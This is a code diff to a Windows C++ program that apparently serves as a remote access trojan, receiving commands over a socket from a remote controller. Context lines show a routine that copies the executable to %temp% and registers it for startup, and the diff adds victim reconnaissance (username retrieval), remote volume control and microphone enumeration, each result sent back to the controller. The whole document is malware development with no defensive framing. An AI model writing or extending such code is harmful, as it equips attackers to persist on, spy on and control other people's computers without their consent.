@@ -244,7 +244,11 @@ int main(int argc, char* argv[])
                 std::string clientIPInfo = "Client IP: " + std::string(clientIPStr);
 
                 std::string processor = "Processor: " + std::string("TODO: Retrieve processor information");
-                std::string username = "User: " + std::string("TODO: Retrieve username");
+
+                char username_buff[256];
+                DWORD username_len = sizeof(username_buff);
+                GetUserName(username_buff, &username_len);
+                std::string username = "User: " + std::string(username_buff);
 
                 std::string output = systemInfo + "\n" + architecture + "\n" + "Name of Computer: " + computerNameStr + "\n" +
                                     processor + "\n" + elevated + "\n" + username + "\n";
@@ -453,6 +457,47 @@ int main(int argc, char* argv[])
                 RegCloseKey(hKey);
 
                 std::string callback = std::string(szModulePath) + " was copied to \%temp\% and added to startup";
+                send(s, callback.c_str(), callback.size(), 0);
+            }
+            else if (command.substr(0, 6) == "volume") {
+                std::string volumeStr = command.substr(7);
+                int volume = std::stoi(volumeStr);
+                
+                // changing volume
+
+                DWORD defaultDeviceId = WAVE_MAPPER;
+
+                // open output device
+                HWAVEOUT hwo;
+                waveOutOpen(&hwo, defaultDeviceId, NULL, 0, 0, WAVE_FORMAT_QUERY);
+
+                // set new volume
+                waveOutSetVolume(hwo, volume);
+
+                // close device
+                waveOutClose(hwo);
+
+                std::string callback = "Volume was changed to " + volumeStr;
+                send(s, callback.c_str(), callback.size(), 0);
+            }
+            else if (command == "microphones" || command == "mics") {
+                UINT deviceCount = waveInGetNumDevs(); // get num of devices
+
+                std::string callback;
+
+                if (deviceCount > 0)
+                {
+                    for (int i=0;i<deviceCount;i++)
+                    {
+                        WAVEINCAPSW waveInCaps;
+                        waveInGetDevCapsW(i, &waveInCaps, sizeof(WAVEINCAPS));
+
+                        std::wstring deviceName(waveInCaps.szPname);
+                        std::string deviceNameStr(deviceName.begin(), deviceName.end());
+                        callback += deviceNameStr + "\n";
+                    }
+                }
+
                 send(s, callback.c_str(), callback.size(), 0);
             }
 
